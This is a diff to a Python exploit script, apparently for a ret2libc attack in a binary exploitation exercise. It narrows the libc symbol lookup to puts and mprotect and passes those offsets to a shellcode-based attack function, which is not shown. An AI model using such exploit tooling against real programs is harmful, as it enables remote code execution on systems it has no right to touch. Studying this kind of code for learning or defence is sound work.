@@ -121,7 +121,7 @@ def getLibcSymbolOffsets(libcJson):
     libcUrl = libcSearchUrl+libId
     
     # Define extra symbols to retrieve from the database
-    findSymbols = {"symbols": ["exit", "mprotect", "malloc", "memcpy"]}
+    findSymbols = {"symbols": ["mprotect"]}
 
     # Request symbols from the datatbase
     response = requests.post(libcUrl, headers=HEADERS, data=json.dumps(findSymbols))
@@ -129,14 +129,11 @@ def getLibcSymbolOffsets(libcJson):
 
     # Store the symbols into variables
     putsOff = symbolJson['symbols'].get('puts')
-    systemOff = symbolJson['symbols'].get('system')
-    exitOff = symbolJson['symbols'].get('exit')
     mprotectOff = symbolJson['symbols'].get('mprotect')
-    bin_shOff = symbolJson['symbols'].get('str_bin_sh')
     print()
     log.info("Trying offsets for libc version: "+libId)
-    log.info(f"Offsets - puts: {putsOff}, system: {systemOff}, str_bin_sh: {bin_shOff}, exit: {exitOff}, mprotect: {mprotectOff}")
-    return putsOff, systemOff, exitOff, bin_shOff, mprotectOff
+    log.info(f"Offsets - puts: {putsOff}, mprotect: {mprotectOff}")
+    return putsOff, mprotectOff
 
 
 def main():
@@ -145,7 +142,7 @@ def main():
 
         for item in responseJson:
         # Get the symbol offsets for the specific libc version
-            putsOff, systemOff, exitOff, bin_shOff, mprotectOff = getLibcSymbolOffsets(item)
+            putsOff, mprotectOff = getLibcSymbolOffsets(item)
             
             attemptR2Libc_shellcode(int(putsOff,16),int(mprotectOff,16))
 
